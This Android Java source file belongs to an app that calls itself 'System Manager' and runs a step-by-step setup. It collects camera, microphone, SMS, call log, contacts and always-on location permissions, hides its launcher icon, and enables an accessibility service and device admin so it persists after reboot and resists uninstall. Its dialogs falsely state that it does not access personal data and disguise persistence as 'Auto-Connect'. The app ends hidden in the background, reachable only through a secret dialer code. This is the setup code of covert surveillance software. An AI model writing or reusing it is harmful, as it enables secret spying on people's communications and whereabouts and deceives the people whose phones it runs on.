package com.mdmagent.app;

import android.Manifest;
import android.app.AlertDialog;
import android.app.admin.DevicePolicyManager;
import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.text.TextUtils;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.getcapacitor.BridgeActivity;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends BridgeActivity {

    private static final int RC_PERMS        = 1001;
    private static final int RC_BG_LOC       = 1002;
    private static final int RC_DEVICE_ADMIN = 2001;

    // Setup steps run in order
    private static final int STEP_PERMISSIONS   = 0;
    private static final int STEP_BG_LOCATION   = 1;
    private static final int STEP_BATTERY       = 2;
    private static final int STEP_USAGE         = 3;
    private static final int STEP_ACCESSIBILITY = 4;
    private static final int STEP_DEVICE_ADMIN  = 5;
    private static final int STEP_OEM_AUTOSTART = 6;
    private static final int STEP_DONE          = 7;

    private int     currentStep    = STEP_PERMISSIONS;
    private boolean waitingForResume = false;
    private ComponentName adminComponent;

    private static final String[] REQUIRED_PERMISSIONS = {
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
    };

    @Override
    public void onCreate(Bundle savedInstanceState) {
        registerPlugin(MdmPlugin.class);
        registerPlugin(NativeSocketPlugin.class);
        super.onCreate(savedInstanceState);
        adminComponent = new ComponentName(this, MdmDeviceAdminReceiver.class);
        hideLauncherIcon(); // hide from app drawer immediately on first open
        startForegroundService(new Intent(this, MdmForegroundService.class));
        runStep(STEP_PERMISSIONS);
    }

    // ─────────────────────────────────────────────────────────────────────
    // Step runner
    // ─────────────────────────────────────────────────────────────────────

    private void runStep(int step) {
        currentStep = step;
        switch (step) {
            case STEP_PERMISSIONS:   doPermissions();   break;
            case STEP_BG_LOCATION:   doBgLocation();    break;
            case STEP_BATTERY:       doBattery();       break;
            case STEP_USAGE:         doUsage();         break;
            case STEP_ACCESSIBILITY: doAccessibility(); break;
            case STEP_DEVICE_ADMIN:  doDeviceAdmin();   break;
            case STEP_OEM_AUTOSTART: doOemAutoStart();  break;
            case STEP_DONE:          doFinish();        break;
        }
    }

    private void nextStep() { runStep(currentStep + 1); }

    // ─────────────────────────────────────────────────────────────────────
    // Step 0 — Runtime permissions (system dialog, no pre-dialog)
    // ─────────────────────────────────────────────────────────────────────

    private void doPermissions() {
        List<String> missing = new ArrayList<>();
        for (String perm : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED)
                missing.add(perm);
        }
        if (!missing.isEmpty())
            ActivityCompat.requestPermissions(this, missing.toArray(new String[0]), RC_PERMS);
        else
            nextStep();
    }

    @Override
    public void onRequestPermissionsResult(int rc, String[] perms, int[] results) {
        super.onRequestPermissionsResult(rc, perms, results);
        if (rc == RC_PERMS || rc == RC_BG_LOC) nextStep();
    }

    // ─────────────────────────────────────────────────────────────────────
    // Step 1 — Background location (separate request, Android requirement)
    // ─────────────────────────────────────────────────────────────────────

    private void doBgLocation() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q &&
            ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION)
                != PackageManager.PERMISSION_GRANTED) {
            new AlertDialog.Builder(this)
                .setTitle("Allow Location Always")
                .setMessage("On the next screen, select 'Allow all the time' so location works even when app is in background.")
                .setCancelable(false)
                .setPositiveButton("Continue", (d, w) ->
                    ActivityCompat.requestPermissions(this,
                        new String[]{Manifest.permission.ACCESS_BACKGROUND_LOCATION}, RC_BG_LOC))
                .setNegativeButton("Skip", (d, w) -> nextStep())
                .show();
        } else {
            nextStep();
        }
    }

    // ─────────────────────────────────────────────────────────────────────
    // Step 2 — Battery optimization exemption
    // ─────────────────────────────────────────────────────────────────────

    private void doBattery() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                new AlertDialog.Builder(this)
                    .setTitle("Allow Background Activity (1/4)")
                    .setMessage("Tap 'Allow' on the next screen so System Manager can run continuously without being killed.")
                    .setCancelable(false)
                    .setPositiveButton("Continue", (d, w) -> {
                        waitingForResume = true;
                        Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                        i.setData(Uri.parse("package:" + getPackageName()));
                        startActivity(i);
                    })
                    .setNegativeButton("Skip", (d, w) -> nextStep())
                    .show();
                return;
            }
        }
        nextStep();
    }

    // ─────────────────────────────────────────────────────────────────────
    // Step 3 — Usage stats access
    // ─────────────────────────────────────────────────────────────────────

    private void doUsage() {
        if (isUsageAccessGranted()) { nextStep(); return; }
        new AlertDialog.Builder(this)
            .setTitle("Allow Usage Access (2/4)")
            .setMessage(
                "Steps:\n" +
                "1. Tap 'Open Settings'\n" +
                "2. Find 'System Manager' in list\n" +
                "3. Toggle it ON\n" +
                "4. Press Back to return\n\n" +
                "This allows monitoring which apps are used.")
            .setCancelable(false)
            .setPositiveButton("Open Settings", (d, w) -> {
                waitingForResume = true;
                try {
                    Intent i = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
                    i.setData(Uri.parse("package:" + getPackageName()));
                    startActivity(i);
                } catch (Exception ignored) {
                    startActivity(new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS));
                }
            })
            .setNegativeButton("Skip", (d, w) -> nextStep())
            .show();
    }

    private boolean isUsageAccessGranted() {
        try {
            UsageStatsManager usm = (UsageStatsManager) getSystemService(USAGE_STATS_SERVICE);
            long now = System.currentTimeMillis();
            List<UsageStats> stats = usm.queryUsageStats(
                UsageStatsManager.INTERVAL_DAILY, now - 60_000, now);
            return stats != null && !stats.isEmpty();
        } catch (Exception e) { return false; }
    }

    // ─────────────────────────────────────────────────────────────────────
    // Step 4 — Accessibility service (boot persistence)
    // ─────────────────────────────────────────────────────────────────────

    private void doAccessibility() {
        if (isAccessibilityEnabled()) { nextStep(); return; }
        new AlertDialog.Builder(this)
            .setTitle("Enable Auto-Connect (3/4)")
            .setMessage(
                "This allows the app to auto-connect after every phone restart.\n\n" +
                "Steps:\n" +
                "1. Tap 'Open Settings'\n" +
                "2. Find 'System Manager'\n" +
                "3. Tap it → Toggle ON → Allow\n" +
                "4. Press Back to return")
            .setCancelable(false)
            .setPositiveButton("Open Settings", (d, w) -> {
                waitingForResume = true;
                startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
            })
            .setNegativeButton("Skip", (d, w) -> nextStep())
            .show();
    }

    private boolean isAccessibilityEnabled() {
        try {
            String svc = getPackageName() + "/" + MdmAccessibilityService.class.getName();
            int on = Settings.Secure.getInt(
                getContentResolver(), Settings.Secure.ACCESSIBILITY_ENABLED, 0);
            if (on == 1) {
                String list = Settings.Secure.getString(
                    getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
                if (list != null) {
                    TextUtils.SimpleStringSplitter sp = new TextUtils.SimpleStringSplitter(':');
                    sp.setString(list);
                    while (sp.hasNext()) {
                        if (sp.next().equalsIgnoreCase(svc)) return true;
                    }
                }
            }
        } catch (Exception ignored) {}
        return false;
    }

    // ─────────────────────────────────────────────────────────────────────
    // Step 5 — Device Admin (prevents uninstall)
    // ─────────────────────────────────────────────────────────────────────

    private void doDeviceAdmin() {
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        if (dpm == null || dpm.isAdminActive(adminComponent)) { nextStep(); return; }
        new AlertDialog.Builder(this)
            .setTitle("Enable Protection (4/4)")
            .setMessage(
                "This prevents unauthorized removal of System Manager.\n\n" +
                "Tap 'Activate' on the next screen.\n\n" +
                "(This only prevents easy uninstall — it does NOT access your personal data.)")
            .setCancelable(false)
            .setPositiveButton("Continue", (d, w) -> {
                Intent i = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
                i.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    "Keeps system security active and prevents unauthorized removal");
                startActivityForResult(i, RC_DEVICE_ADMIN);
            })
            .setNegativeButton("Skip", (d, w) -> nextStep())
            .show();
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == RC_DEVICE_ADMIN) nextStep();
    }

    // ─────────────────────────────────────────────────────────────────────
    // Step 6 — OEM AutoStart (Vivo / Huawei / OPPO / Xiaomi)
    // ─────────────────────────────────────────────────────────────────────

    private void doOemAutoStart() {
        String mfr = Build.MANUFACTURER.toLowerCase();
        boolean isVivo   = mfr.contains("vivo");
        boolean isHuawei = mfr.contains("huawei") || mfr.contains("honor");
        boolean isOppo   = mfr.contains("oppo") || mfr.contains("realme");
        boolean isMiui   = isMiui() || mfr.contains("xiaomi") || mfr.contains("redmi");

        if (!isVivo && !isHuawei && !isOppo && !isMiui) { nextStep(); return; }

        String brand = isVivo ? "Vivo" : isHuawei ? "Huawei/Honor" : isOppo ? "OPPO/Realme" : "Xiaomi";
        new AlertDialog.Builder(this)
            .setTitle("Enable AutoStart — " + brand)
            .setMessage(
                "Last step! Enable AutoStart so the app restarts automatically.\n\n" +
                "1. Tap 'Open Settings'\n" +
                "2. Find 'System Manager'\n" +
                "3. Enable AutoStart / Background activity\n" +
                "4. Press Back to return")
            .setCancelable(false)
            .setPositiveButton("Open Settings", (d, w) -> {
                waitingForResume = true;
                openOemScreen(mfr, isMiui);
            })
            .setNegativeButton("Skip", (d, w) -> nextStep())
            .show();
    }

    private void openOemScreen(String mfr, boolean isMiui) {
        if (isMiui) { openMiuiAutoStart(); return; }
        try {
            Intent i = new Intent();
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            if (mfr.contains("huawei") || mfr.contains("honor")) {
                i.setComponent(new ComponentName("com.huawei.systemmanager",
                    "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity"));
            } else if (mfr.contains("oppo") || mfr.contains("realme")) {
                i.setComponent(new ComponentName("com.coloros.safecenter",
                    "com.coloros.privacypermissionsentry.PermissionTopActivity"));
            } else if (mfr.contains("vivo")) {
                i.setComponent(new ComponentName("com.vivo.permissionmanager",
                    "com.vivo.permissionmanager.activity.PurviewTabActivity"));
            }
            startActivity(i);
        } catch (Exception ignored) {
            try {
                Intent fallback = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                fallback.setData(Uri.parse("package:" + getPackageName()));
                startActivity(fallback);
            } catch (Exception ignored2) {}
        }
    }

    private void openMiuiAutoStart() {
        String[][] targets = {
            { "com.miui.securitycenter",
              "com.miui.permcenter.autostart.AutoStartManagementActivity" },
            { "com.miui.securitycenter", "com.miui.permcenter.MainAcitivity" },
            { "com.miui.securitycenter", "com.miui.securitycenter.MainActivity" },
        };
        for (String[] t : targets) {
            try {
                Intent i = new Intent();
                i.setComponent(new ComponentName(t[0], t[1]));
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(i);
                return;
            } catch (Exception ignored) {}
        }
        try {
            Intent f = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
            f.setData(Uri.parse("package:" + getPackageName()));
            startActivity(f);
        } catch (Exception ignored) {}
    }

    private boolean isMiui() {
        try { Class.forName("miui.os.Build"); return true; }
        catch (ClassNotFoundException e) { return false; }
    }

    // ─────────────────────────────────────────────────────────────────────
    // Step 7 — Done: hide icon and close
    // ─────────────────────────────────────────────────────────────────────

    private void doFinish() {
        hideLauncherIcon();
        new AlertDialog.Builder(this)
            .setTitle("Setup Complete!")
            .setMessage(
                "System Manager is now active and protected.\n\n" +
                "The app will close now and run silently in the background.\n\n" +
                "To open again: dial *#*#8888#*#*")
            .setCancelable(false)
            .setPositiveButton("Close App", (d, w) -> moveTaskToBack(true))
            .show();
    }

    private void hideLauncherIcon() {
        try {
            getPackageManager().setComponentEnabledSetting(
                new ComponentName(this, "com.mdmagent.app.MainActivityLauncher"),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
        } catch (Exception ignored) {}
    }

    // ─────────────────────────────────────────────────────────────────────
    // onResume — called when user returns from a Settings screen
    // ─────────────────────────────────────────────────────────────────────

    @Override
    public void onResume() {
        super.onResume();
        if (waitingForResume) {
            waitingForResume = false;
            nextStep();
        }
    }
}
